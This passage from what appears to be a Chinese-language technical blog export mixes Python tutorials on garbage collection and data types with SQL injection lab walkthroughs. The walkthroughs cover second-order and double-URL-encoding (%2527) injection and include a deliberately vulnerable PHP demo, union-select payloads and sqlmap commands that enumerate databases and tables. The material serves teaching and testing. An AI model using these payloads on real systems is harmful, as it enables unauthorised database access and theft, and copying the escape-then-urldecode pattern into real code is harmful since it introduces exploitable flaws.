1,user(),3#&#39;</span><br></pre></td></tr></table></figure><p>由于我们知道username里面没有1，1是不存在的结果，就执行联合查询语句<code>union select 1,user(),3</code></p><p>然后我们继续注入一下，注册密码由于和注入无关，就随便写了</p><h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号名: 1&#39; union select 1,(select schema_name from information_schema.schemata limit 0,1),3#</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200823000937740.png" alt="image-20200823000937740"></p><h3 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号名: 1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479),3#</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200823001126345.png" alt="image-20200823001126345"></p><hr><h1 id="二次注入防御"><a href="#二次注入防御" class="headerlink" title="二次注入防御"></a>二次注入防御</h1><p>对外部提交的数据，需要更加谨慎的对待</p><p>程序内部的数据调用，也需要进行严格审查，一旦不小心，测试者就能将特定的SQL语句带入到查询中</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8.python垃圾回收机制详解</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/8.python%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/8.python%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>我们<a href="archives/1.%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/3.Python/6.Python%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E4%B9%8B%E5%8F%98%E9%87%8F.html">变量章节</a>已经简单提到过了垃圾回收机制(GC)，但很简要，本章来详细描述它的运行原理和过程的</p><hr><h1 id="垃圾回收机制-GC"><a href="#垃圾回收机制-GC" class="headerlink" title="垃圾回收机制(GC)"></a>垃圾回收机制(GC)</h1><p>垃圾回收机制(简称GC)是Python解释器自带一种机制，专门用来回收不可用的变量值所占用的内存空间</p><p>程序运行过程中会申请大量的内存空间，会申请内存空间来存放变量的值，而内存的容量是有限的，而对于一些无用的内存空间如果不及时清理的话会导致内存使用殆尽(内存溢出),导致程序崩溃，这就涉及到变量值所占用内存空间的回收问题，当一个变量值没有用了（简称垃圾）就应该将其占用的内存给回收掉，但管理内存是一件重要且繁杂的事情，幸好python解释器自带的垃圾回收机制把程序员从繁杂的内存管理中解放出来</p><a id="more"></a><hr><h1 id="理解GC原理需要储备的知识"><a href="#理解GC原理需要储备的知识" class="headerlink" title="理解GC原理需要储备的知识"></a>理解GC原理需要储备的知识</h1><h2 id="堆区与栈区"><a href="#堆区与栈区" class="headerlink" title="堆区与栈区"></a>堆区与栈区</h2><p> 在定义变量时，变量名与变量值都是需要存储的，分别对应内存中的两块区域：堆区与栈区。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、变量名与值内存地址的关联关系存放于栈区</span></span><br><span class="line"><span class="comment"># 2、变量值存放于堆区，内存管理回收的则是堆区的内容，</span></span><br></pre></td></tr></table></figure><p> 定义了两个变量x = 10、y = 20，详解如下图,</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-73d5845ef7dc5a403333d2099d456fc0_720w.jpg" alt="img"></p><p>当我们执行<code>x=y</code>时，内存中的栈区与堆区变化如下</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-9ec5b20fd2c2d2e9c90194d57bcf7778_720w.jpg" alt="img"></p><h2 id="直接引用与间接引用"><a href="#直接引用与间接引用" class="headerlink" title="直接引用与间接引用"></a>直接引用与间接引用</h2><p>可能有其他编程经验的小伙伴们都应该知道一个概念，叫做引用数据类型，python由于是弱类型语言，没有基本数据类型和引用数据类型的区分，或者可以说理解为，<strong>python全都是引用数据类型</strong>，无外乎是直接引用和间接引用的区别</p><p> 直接引用指的是从栈区出发直接引用到的内存地址，而间接引用指的是从栈区出发引用到堆区后，再通过进一步引用才能到达的内存地址</p><blockquote><p>间接引用，通常出现在容器(例如列表、字典等)上，容器变量直接对应的内存空间里，存放的是具体变量和值的<strong>内存地址</strong>(不是变量名，若变量名对应内存空间发生改变，并不影响已定义的间接引用)，计算机读取到具体变量和值的内存地址后，在找到具体空间的值，完成引用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l2 = [<span class="number">20</span>, <span class="number">30</span>]  <span class="comment"># 列表本身被变量名l2直接引用，包含的元素被列表间接引用</span></span><br><span class="line">x = <span class="number">10</span>  <span class="comment"># 值10被变量名x直接引用</span></span><br><span class="line">l1 = [x, l2]  <span class="comment"># 列表本身被变量名l1直接引用，包含的元素被列表间接引用</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-4240913539ce0352a89c4044c2a418e9_720w.jpg" alt="img"></p><hr><h1 id="垃圾回收机制原理"><a href="#垃圾回收机制原理" class="headerlink" title="垃圾回收机制原理"></a>垃圾回收机制原理</h1><p> Python的GC模块主要运用了“引用计数”（reference counting）来跟踪和回收垃圾。在引用计数的基础上，还可以通过“标记-清除”（mark and sweep）解决容器对象可能产生的循环引用的问题，并且通过“分代回收”（generation collection）以空间换取时间的方式来进一步提高垃圾回收的效率</p><h2 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h2><p>引用计数就是：变量值被变量名关联的次数</p><p>简单来说，只要能够访问到那个值的方式，都叫引用，都需要计算引用计数</p><p>引用计数一旦变为0，其占用的内存地址就应该被解释器的垃圾回收机制回收</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引用技术 = 直接引用 + 间接引用</span></span><br><span class="line">x = <span class="number">10</span> <span class="comment">#直接引用</span></span><br><span class="line">y = x  <span class="comment">#直接引用</span></span><br><span class="line">z = x  <span class="comment">#直接引用</span></span><br><span class="line">l1 = [x, l2]  <span class="comment">#间接引用</span></span><br><span class="line">l2 = &#123;<span class="string">&#x27;a&#x27;</span>:x,<span class="string">&#x27;b&#x27;</span>:<span class="number">12</span>&#125; <span class="comment">#间接引用</span></span><br><span class="line"><span class="comment"># 即引用次数为5</span></span><br></pre></td></tr></table></figure><h3 id="引用计数增加"><a href="#引用计数增加" class="headerlink" title="引用计数增加"></a>引用计数增加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">18</span> （此时，变量值<span class="number">18</span>的引用计数为<span class="number">1</span>）</span><br><span class="line">m=age （把age的内存地址给了m，此时，m,age都关联了<span class="number">18</span>，所以变量值<span class="number">18</span>的引用计数为<span class="number">2</span>）</span><br></pre></td></tr></table></figure><h3 id="引用计数减少"><a href="#引用计数减少" class="headerlink" title="引用计数减少"></a>引用计数减少</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">10</span>（名字age先与值<span class="number">18</span>解除关联，再与<span class="number">3</span>建立了关联，变量值<span class="number">18</span>的引用计数为<span class="number">1</span>）</span><br><span class="line"><span class="keyword">del</span> m（<span class="keyword">del</span>的意思是解除变量名x与变量值<span class="number">18</span>的关联关系，此时，变量<span class="number">18</span>的引用计数为<span class="number">0</span>）</span><br></pre></td></tr></table></figure><h2 id="标记清除与分代回收"><a href="#标记清除与分代回收" class="headerlink" title="标记清除与分代回收"></a>标记清除与分代回收</h2><p>我们首先来看一个案例</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-ba7f7e5f5f42b44a24123a48996ac21a_720w.jpg" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义两个列表</span></span><br><span class="line">l1 = [xxx,]<span class="comment"># 列表1被引用一次，列表1的引用计数变为1  </span></span><br><span class="line">l2 = [yyy,] <span class="comment"># 列表2被引用一次，列表2的引用计数变为1  </span></span><br><span class="line"><span class="comment"># 将列表互相引用添加</span></span><br><span class="line">l1.append(l2)<span class="comment">#l1 = [xxx内存地址,l2内存地址]# 列表1被引用二次，列表1的引用计数变为2  </span></span><br><span class="line">l2.append(l1)<span class="comment">#l2 = [yyy内存地址,l1内存地址]# 列表2被引用二次，列表2的引用计数变为2  </span></span><br><span class="line"><span class="comment"># 解除变量名与值的关联</span></span><br><span class="line"><span class="comment"># 但内存地址间还有着关联</span></span><br><span class="line"><span class="keyword">del</span> l1</span><br><span class="line"><span class="keyword">del</span> l2</span><br></pre></td></tr></table></figure><p>然后，由于没有了变量名，两个列表不再被任何其他对象关联，没有任何人可以再引用到它们，所以它俩占用内存空间应该被回收，但由于相互引用的存在，每一个对象的引用计数都不为0，因此这些对象所占用的内存永远不会被释放，所以循环引用是致命的，这与手动进行内存管理所产生的内存泄露毫无区别</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-6a71b134e25254477bef148daf75c328_720w.jpg" alt="img"></p><p>Python引入了“标记-清除” 与“分代回收”来分别解决引用计数的循环引用与效率低的问题</p><h3 id="标记-清除"><a href="#标记-清除" class="headerlink" title="标记-清除"></a>标记-清除</h3><p>标记清除并不是时时刻刻都在运行，他只作用于内存空间不够用的情况，内存空间不够的时候，他会将解释器暂停下来，去扫描栈区，遍历所有的GC Roots对象(栈区中的所有内容或者线程都可以作为GC Roots对象），沿着栈区为出发点进行对堆区的扫描，然后将所有GC Roots的对象可以直接或间接访问到的对象标记为存活的对象，其余的均为非存活对象，应该被清除</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-869f9debccd400e67a57552f72211921_720w.jpg" alt="img"></p><p>启用标记清除算法时，从栈区出发，没有任何一条直接或间接引用可以访达l1与l2，即l1与l2并不存在于栈区，于是l1与l2都没有被标记为存活，二者会被清理掉，这样就解决了循环引用带来的内存泄漏问题。</p><h3 id="分代回收"><a href="#分代回收" class="headerlink" title="分代回收"></a>分代回收</h3><p>基于引用计数的回收机制，每次回收内存，都需要把所有对象的引用计数都遍历一遍，这是非常消耗时间的，于是引入了分代回收来提高回收效率，分代回收采用的是用“空间换时间”的策略。</p><p>分代回收的核心思想是：在历经多次扫描的情况下，都没有被回收的变量，gc机制就会认为，该变量是常用变量，gc对其扫描的频率会降低，具体实现原理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分代指的是根据存活时间来为变量划分不同等级（也就是不同的代）</span><br><span class="line"></span><br><span class="line">新定义的变量，放到新生代这个等级中，假设每隔1分钟扫描新生代一次，如果发现变量依然被引用，那么该对象的权重（权重本质就是个整数）加一，当变量的权重大于某个设定得值（假设为3），会将它移动到更高一级的青春代，青春代的gc扫描的频率低于新生代（扫描时间间隔更长），假设5分钟扫描青春代一次，这样每次gc需要扫描的变量的总个数就变少了，节省了扫描的总时间，接下来，青春代中的对象，也会以同样的方式被移动到老年代中。也就是等级（代）越高，被垃圾回收机制扫描的频率越低</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822151110732.png" alt="image-20200822151110732"></p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>9.二次编码注入</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/9.%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/9.%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义</p><a id="more"></a><hr><h1 id="二次编码注入原理"><a href="#二次编码注入原理" class="headerlink" title="二次编码注入原理"></a>二次编码注入原理</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="为什么要进行编码"><a href="#为什么要进行编码" class="headerlink" title="为什么要进行编码"></a>为什么要进行编码</h3><p>编码肯定是因为原始的格式并不适合传输才进行的，例如<code>+，=，&amp;，；</code>等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">比如某登录场景：</span><br><span class="line">index.php?id&#x3D;1$name&#x3D;admin$pwd&#x3D;123</span><br><span class="line">账号密码中带有&#x3D;号和&amp;号，就可能导致冲突，这些就需要进行url编码</span><br><span class="line">比如</span><br><span class="line">编码前</span><br><span class="line">name&#x3D;admin&#x3D;</span><br><span class="line">编码后</span><br><span class="line">name&#x3D;admin%3d</span><br><span class="line">通常后端程序会自动进行解码</span><br></pre></td></tr></table></figure><p>编程语言都有解码的函数，比如php的<code>urldecode()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urldecode(&#39;%3d&#39;)</span><br></pre></td></tr></table></figure><h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2><p>urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>由于SQLi-Labs没有二次编码注入的场景，这里是跟着老师敲的demo代码构建的场景，命名为doublecode.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;doublecode&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;#000000&quot;</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">&quot;3&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);<span class="comment">//连接数据库</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">$id = mysql_real_escape_string($_GET[<span class="string">&#x27;id&#x27;</span>]);<span class="comment">//将id进行转换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;mysql_real_escape_string:&#x27;</span>.$id.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">$id = urldecode($id);<span class="comment">//urldecode解码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;urldecode:&#x27;</span>.$id.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">//直接带入数据库</span></span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完代码我们已经知道，这里不是宽字节注入的GBK编码，而是UFT-8</p><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>使用单引号被<code>mysql_real_escape_string</code>反斜杠转义，所以我们的代码中不能出现单引号</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822004541541.png" alt="image-20200822004541541"></p><p>而单引号的编码就是<code>%27</code>，进行一下尝试，不行，还是会被认出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;1%27</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822005013994.png" alt="image-20200822005013994"></p><p>这时候我们发现代码中，转移之后还有一个解码的过程<code>$id = urldecode($id);</code></p><p>我们知道百分号<code>%</code>的编码就是%25，而%25会被第一次转换成%，如果在后面直接加上27，组合称为%27，就能够通过测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;1%2527</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822005256440.png" alt="image-20200822005256440"></p><h3 id="过程流程图"><a href="#过程流程图" class="headerlink" title="过程流程图"></a>过程流程图</h3><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822005753066.png" alt="image-20200822005753066"></p><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>在可能的注入点后键入%2527，之后进行测试</p><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><ol><li>是否使用了urldecode函数</li><li>urldecode函数是否在转义方法之后</li></ol><h3 id="简单演示注入"><a href="#简单演示注入" class="headerlink" title="简单演示注入"></a>简单演示注入</h3><p><strong>查列数(有三列)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;1%2527 order by 4 --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822010042475.png" alt="image-20200822010042475"></p><p><strong>查询当前数据库用户名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;-1%2527 union select 1,database(),user() --+</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822010240358.png" alt="image-20200822010240358"></p><h2 id="工具注入"><a href="#工具注入" class="headerlink" title="工具注入"></a>工具注入</h2><h3 id="检查注入"><a href="#检查注入" class="headerlink" title="检查注入"></a>检查注入</h3><p>sqlmap检测二次编码注入，在后面加上<code>%2527</code>即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;-1%2527&quot;</span><br></pre></td></tr></table></figure><p>显示可注入</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822011028047.png" alt="image-20200822011028047"></p><h3 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;-1%2527&quot; --current-db</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822011229366.png" alt="image-20200822011229366"></p><h3 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.101.200&#x2F;demo&#x2F;doublecode.php&#x2F;?id&#x3D;-1%2527&quot; -D security --tables</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822011324678.png" alt="image-20200822011324678"></p><p>就不继续演示了</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7.python语法入门之基本数据类型</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/7.python%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E4%B9%8B%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/7.python%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E4%B9%8B%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>变量是为了让计算机能够像人一样去记忆事物的某种状态，而变量的值就是用来存储事物状态的，很明显事物的状态分成不同种类的（比如人的年龄，身高，职位，工资等等），所以变量值也应该有不同的类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">salary = <span class="number">3.1</span> <span class="comment"># 用浮点型去记录薪资</span></span><br><span class="line">age = <span class="number">18</span> <span class="comment"># 用整型去记录年龄</span></span><br><span class="line">name = <span class="string">&#x27;kinght&#x27;</span> <span class="comment"># 用字符串类型去记录人名</span></span><br></pre></td></tr></table></figure><a id="more"></a><hr><h1 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h1><p>python中原本没有数字类型，这里只是为了更好的分类才列出来的</p><h2 id="int整型"><a href="#int整型" class="headerlink" title="int整型"></a>int整型</h2><p>用来记录人的年龄，出生年份，学生人数等<strong>整数</strong>相关的状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">birthday = <span class="number">1990</span></span><br><span class="line">student_count = <span class="number">48</span></span><br><span class="line">print(type(age)) <span class="comment">#查看数据类型</span></span><br></pre></td></tr></table></figure><h2 id="float浮点型"><a href="#float浮点型" class="headerlink" title="float浮点型"></a>float浮点型</h2><p>用来记录人的身高，体重，薪资等<strong>小数</strong>相关的状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">height = <span class="number">172.3</span></span><br><span class="line">weight = <span class="number">103.5</span></span><br><span class="line">salary = <span class="number">15000.89</span></span><br><span class="line">print(type(height)) <span class="comment">#查看数据类型</span></span><br></pre></td></tr></table></figure><h2 id="进制相关"><a href="#进制相关" class="headerlink" title="进制相关"></a>进制相关</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进制显示</span></span><br><span class="line"><span class="comment"># 二进制 0b</span></span><br><span class="line"><span class="comment"># 八进制0o</span></span><br><span class="line"><span class="comment"># 十六进制0x</span></span><br><span class="line"><span class="comment"># 进制转换(括号内为待转换的值)</span></span><br><span class="line"><span class="comment"># 转换为二进制bin()</span></span><br><span class="line"><span class="comment"># 转换为八进制oct()</span></span><br><span class="line"><span class="comment"># 转换为十进制int()</span></span><br><span class="line"><span class="comment"># 转换为十六进制hex()</span></span><br></pre></td></tr></table></figure><h2 id="整数与浮点数计算"><a href="#整数与浮点数计算" class="headerlink" title="整数与浮点数计算"></a>整数与浮点数计算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#整数+浮点数=浮点数</span></span><br><span 